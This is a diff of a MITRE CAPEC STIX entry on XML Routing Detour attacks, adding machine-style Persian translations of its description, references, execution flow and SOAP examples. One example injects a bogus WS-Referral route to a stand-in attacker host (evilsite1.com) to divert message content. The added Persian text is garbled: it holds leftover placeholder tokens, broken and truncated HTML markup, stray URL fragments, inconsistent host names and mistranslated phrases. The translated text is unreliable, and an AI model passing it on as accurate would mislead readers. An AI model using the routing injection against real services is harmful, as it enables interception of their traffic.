@@ -9,47 +9,60 @@
                 {
                     "external_id": "CAPEC-219",
                     "source_name": "capec",
-                    "url": "https://capec.mitre.org/data/definitions/219.html"
+                    "url": "https://capec.mitre.org/data/definitions/219.html",
+                    "source_name_fa": "capec"
                 },
                 {
                     "external_id": "CWE-441",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/441.html"
+                    "url": "http://cwe.mitre.org/data/definitions/441.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "external_id": "CWE-610",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/610.html"
+                    "url": "http://cwe.mitre.org/data/definitions/610.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "description": "Routing Detour",
                     "external_id": "32",
                     "source_name": "WASC",
-                    "url": "http://projects.webappsec.org/Routing-Detour"
+                    "url": "http://projects.webappsec.org/Routing-Detour",
+                    "description_fa": "مسیر انحرافی",
+                    "source_name_fa": "WASC"
                 },
                 {
                     "description": "XML Entity Expansion",
                     "external_id": "44",
                     "source_name": "WASC",
-                    "url": "http://projects.webappsec.org/XML-Entity-Expansion"
+                    "url": "http://projects.webappsec.org/XML-Entity-Expansion",
+                    "description_fa": "گسترش نهاد XML",
+                    "source_name_fa": "WASC"
                 },
                 {
                     "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
                     "external_id": "REF-80",
                     "source_name": "reference_from_CAPEC",
-                    "url": "http://projects.webappsec.org/w/page/13246956/Routing-Detour"
+                    "url": "http://projects.webappsec.org/w/page/13246956/Routing-Detour",
+                    "description_fa": "WASC Threat Classification 2.0، 2010، کنسرسیوم امنیت برنامه های وب (WASC)",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "Andre Yee, Threat Protection in a Service Oriented World, NFR Security",
                     "external_id": "REF-81",
                     "source_name": "reference_from_CAPEC",
-                    "url": "http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf"
+                    "url": "http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf",
+                    "description_fa": "آندره یی، حفاظت از تهدید در دنیای خدمات گرا، امنیت NFR",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "Pete Lindstrom, Attacking & Defending Web Services, 2002, SPiRE Security",
                     "external_id": "REF-65",
                     "source_name": "reference_from_CAPEC",
-                    "url": "http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf"
+                    "url": "http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf",
+                    "description_fa": "پیت لیندستروم، حمله و دفاع از خدمات وب، 2002، امنیت SPiRE",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 }
             ],
             "id": "attack-pattern--9b939586-fbef-4343-94f0-0046124e3e7f",
@@ -86,6 +99,28 @@
                 ],
                 "Non-Repudiation": [
                     "Gain Privileges"
+                ],
+                "Access_Control_fa": [
+                    "مکانیسم حفاظت دور زدن"
+                ],
+                "Accountability_fa": [
+                    "کسب امتیازات"
+                ],
+                "Authentication_fa": [
+                    "کسب امتیازات"
+                ],
+                "Authorization_fa": [
+                    "کسب امتیازات",
+                    "مکانیسم حفاظت دور زدن"
+                ],
+                "Confidentiality_fa": [
+                    "داده ها را بخوانید"
+                ],
+                "Integrity_fa": [
+                    "داده ها را اصلاح کنید"
+                ],
+                "Non-Repudiation_fa": [
+                    "کسب امتیازات"
                 ]
             },
             "x_capec_domains": [
@@ -104,11 +139,24 @@
                 "The attacker must be able to insert or compromise a system into the processing path for the transaction."
             ],
             "x_capec_skills_required": {
-                "Low": "To inject a bogus node in the XML routing table"
+                "Low": "To inject a bogus node in the XML routing table",
+                "Low_fa": "برای تزریق یک گره جعلی در جدول مسیریابی XML"
             },
             "x_capec_status": "Draft",
             "x_capec_typical_severity": "Medium",
-            "x_capec_version": "3.9"
+            "x_capec_version": "3.9",
+            "description_fa": "یک مهاجم یک سیستم میانی را که برای پردازش محتوای XML استفاده می‌شود واژگون می‌کند و واسطه را مجبور می‌کند تا پردازش محتوا را اصلاح و/یا مسیریابی مجدد کند. حملات انحرافی مسیریابی XML در حملات از نوع میانی (CAPEC-94) دشمن هستند. مهاجم یک سیستم میانی را در پردازش پیام XML به خطر می اندازد یا وارد می کند. به عنوان مثال، WS-Routing می تواند برای تعیین یک سری گره یا واسطه که محتوا از طریق آنها ارسال می شود، استفاده شود. اگر هر یک از گره های میانی در این مسیر توسط یک مهاجم در معرض خطر قرار گیرند، می توانند برای یک حمله انحرافی مسیریابی استفاده شوند. از سیستم آسیب‌دیده، مهاجم می‌تواند فرآیند XML را به گره‌های دیگر مورد نظر خود هدایت کند و پاسخ‌ها را طوری تغییر دهد که زنجیره معمولی پردازش از رهگیری بی‌اطلاع باشد. این سیستم می تواند پیام را به یک نهاد خارجی ارسال کند و با تغییر اطلاعات هدر، ارسال و پردازش را از سیستم های پردازش قانونی پنهان کند.",
+            "name_fa": "حملات انحرافی مسیریابی XML",
+            "x_capec_example_instances_fa": [
+                "<xhtml:p> در اینجا یک نمونه تماس SOAP از یک کلاینت، example1.com، به یک هدف، example4.com، از طریق 2 واسطه، example2.com و example3.com آورده شده است. (توجه: کلاینت در اینجا لزوماً یک «کاربر نهایی» نیست، بلکه نقطه شروع تراکنش XML است).</xhtml:p>\n               <xhtml:b>نمونه پیام SOAP با اطلاعات مسیریابی در هدر:</xhtml:b>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">\n                  <xhtml:div style=\"margin-left:1em;\"><S:Envelope><xhtml:div style=\"margin-left:1em;\"><S:Header><xhtml:div style=\"margin-left:1em;\"><m:path xmlns:m=\"[[[CTI_PRESERVE_0]=\"[RESERVE_0]]][VE_TI] S:mustUnderstand=\"1\"><xhtml:div style=\"margin-left:1em;\"><m:action>http://example1.com/</m:action></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:to>http://example4.com/router</m:to></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:fwd> <m:via>http://example2.com/router</m:via> </m:fwd></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:rev /></xhtml:div></m:path></xhtml:div></S:Header></xhtml:div>\n                     <xhtml:div style=\"margin-left:1em;\"><S:Body><xhtml:div style=\"margin-left:1em;\">...</xhtml:div></S:Body></xhtml:div></S:Envelope></xhtml:div>\n                  \n                  <xhtml:p>یک گره اضافی (example3.com/router) به مسیر XML در پیام WS-Referral اضافه کنید</xhtml:p>\n                  <xhtml:div style=\"margin-left:1em;\"><r:ref xmlns:r=\"http://schemas.example.com/referral\"><xhtml:div style=\"margin-left:1em;\"><r:for><xhtml:div style=\"margin-left:1em;\"><r:prefix>[[[CTI_PRESERVE_6]\n                     <xhtml:div style=\"margin-left:1em;\"><r:if/></xhtml:div>\n                     <xhtml:div style=\"margin-left:1em;\"><r:go><xhtml:div style=\"margin-left:1em;\"><r:via>http://example3.com/router</r:via></xhtml:div></r:go></xhtml:div></r:ref></xhtml:div>\n               </xhtml:div>\n               <xhtml:b>در نتیجه سربرگ SOAP زیر ایجاد می شود:</xhtml:b>\n               <xhtml:div style=\"margin-left:1em;\" class=\"نتیجه\">\n                  <xhtml:div style=\"margin-left:1em;\"><S:Envelope><xhtml:div style=\"margin-left:1em;\"><S:Header><xhtml:div style=\"margin-left:1em;\"><m:path xmlns:m=\"http://schemas.example.com/rp/\"][VE_TI] S:mustUnderstand=\"1\"><xhtml:div style=\"margin-left:1em;\"><m:action>http://example1.com/</m:action></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:to>http://example4.com/router</m:to></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:fwd><xhtml:div style=\"margin-left:1em;\"><m:via>http://example2.com/router</m:via></xhtml:div>\n                              <xhtml:div style=\"margin-left:1em;\"><m:via>http://example3.com/router</m:via></xhtml:div></m:fwd></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:rev /></xhtml:div></m:path></xhtml:div></S:Header></xhtml:div>\n                     <xhtml:div style=\"margin-left:1em;\"><S:Body><xhtml:div style=\"margin-left:1em;\">...</xhtml:div></S:Body></xhtml:div></S:Envelope></xhtml:div>\n               </xhtml:div>\n               <xhtml:p>در ادامه این مثال، مهاجم یک گره مسیریابی جعلی (با استفاده از سرویس WS-Referral) را به جدول مسیریابی هدر XML تزریق می کند، اما به پیام مستقیماً روی گره آغازگر/واسطه ای که هدف قرار داده است دسترسی ندارد.</xhtml:p>\n               <xhtml:b>نمونه ای از تزریق مسیریابی WS مبتنی بر ارجاع از مسیر گره جعلی:</xhtml:b>\n               <xhtml:div style=\"margin-left:1em;\" class=\"attack\">\n                  <xhtml:div style=\"margin-left:1em;\"><r:ref xmlns:r=\"http://schemas.example.com/referral\"><xhtml:div style=\"margin-left:1em;\"><r:for><xhtml:div style=\"margin-left:1em;\"><r:prefix>[[][CTI_PRESERVE_1\n                     <xhtml:div style=\"margin-left:1em;\"><r:if/></xhtml:div>\n                     <xhtml:div style=\"margin-left:1em;\"><r:go><xhtml:div style=\"margin-left:1em;\"><r:via>http://evilsite1.com/router</r:via></xhtml:div></r:go></xhtml:div></r:ref></xhtml:div>\n               </xhtml:div>\n               <xhtml:b> نتیجه حمله انحرافی مسیریابی XML:</xhtml:b>\n               <xhtml:div style=\"margin-left:1em;\" class=\"نتیجه\">\n                  > S:mustUnderstand=\"1\"><xhtml:div style=\"margin-left:1em;\"><m:action>http://example_0.com/</m:action></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:to>http://example_4.com/router</m:to></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:fwd><xhtml:div style=\"margin-left:1em;\"><m:via>http://example2.com/router</m:via></xhtml:div>\n                              <xhtml:div style=\"margin-left:1em;\"><m:via>http://evilesite1.com/router</m:via></xhtml:div>\n                              <xhtml:div style=\"margin-left:1em;\"><m:via>http://example3.com/router</m:via></xhtml:div></m:fwd></xhtml:div>\n                           <xhtml:div style=\"margin-left:1em;\"><m:rev /></xhtml:div></m:path></xhtml:div></S:Header></xhtml:div>\n                     <xhtml:div style=\"margin-left:1em;\"><S:Body><xhtml:div style=\"margin-left:1em;\">...</xhtml:div></S:Body></xhtml:div></S:Envelope></xhtml:div>\n               </xhtml:div>\n               <xhtml:p>بنابراین، مهاجم می تواند پیام XML را به گره کنترل شده مهاجم (و دسترسی به محتوای پیام) هدایت کند.</xhtml:p> http://schemas.example.com/rp/\" http://schemas.example.com/soap/actor\" http://example2.com/router</r:prefix></xhtml:div></r:for></xhtml:div> http://schemas.example.com/soap/actor\" http://example2.com/router</r:prefix></xhtml:div></r:for></xhtml:div> http://schemas.example.com/soap/actor\""
+            ],
+            "x_capec_execution_flow_fa": "<h2> جریان اجرا </h2><div><h3>کاوش</h3><ol><li> <p> <b>بررسی هدف: </b>با استفاده از خط فرمان یا یک ابزار خودکار، مهاجم تمام نمونه‌های سرویس‌های وب را برای پردازش درخواست‌های XML ثبت می‌کند. برای ضبط همه نمونه‌ها برای پردازش درخواست‌های XML یا یافتن WSDL در معرض.</td></tr><tr><td>از ابزارهایی برای خزیدن در WSDL استفاده کنید</td></tr></tbody></table></ol></div><div><h3>آزمایش</h3><ol><li> <p> <b>تشخیص دهید که آیا SOAP حالت‌های متعددی دارند یا نه. پردازش XML چندین مرحله دارد یا خیر.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>سر مسیریابی پیام SOAP را بررسی کنید تا ببینید آیا پردازش XML چندین مرحله دارد یا خیر. حمله انحرافی مسیریابی XML: </b> مهاجم یک گره مسیریابی جعلی (با استفاده از سرویس ارجاع WS) به جدول مسیریابی سربرگ XML پیام SOAP شناسایی شده در مرحله کاوش تزریق می کند. بنابراین، مهاجم می‌تواند پیام XML را به گره کنترل‌شده مهاجم هدایت کند (و به محتوای پیام دسترسی پیدا کند).</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>مهاجم یک گره مسیریابی جعلی (با استفاده از سرویس ارجاع WS) را به جدول مسیریابی سربرگ XMLAP تزریق می‌کند. پیام</td></tr></tbody></table></ol></div>",
+            "x_capec_prerequisites_fa": [
+                "سیستم هدف باید دارای چندین مرحله پردازش محتوای XML باشد."
+            ],
+            "x_capec_resources_required_fa": [
+                "مهاجم باید بتواند سیستمی را در مسیر پردازش تراکنش وارد یا به خطر بیاندازد."
+            ]
         }
     ],
     "type": "bundle"
